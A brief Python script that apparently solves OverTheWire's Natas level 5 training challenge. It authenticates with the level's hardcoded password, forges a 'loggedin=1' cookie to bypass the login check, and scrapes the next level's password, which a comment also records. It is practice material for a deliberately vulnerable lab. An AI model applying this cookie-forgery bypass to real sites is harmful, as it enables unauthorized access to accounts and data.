import requests
import re

url = 'http://natas5.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
response = requests.get(url, auth=auth, cookies={'loggedin':'1'})
password = re.findall('Access granted. The password for natas6 is (.*)</div>', response.text)
print(password[0]) # aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

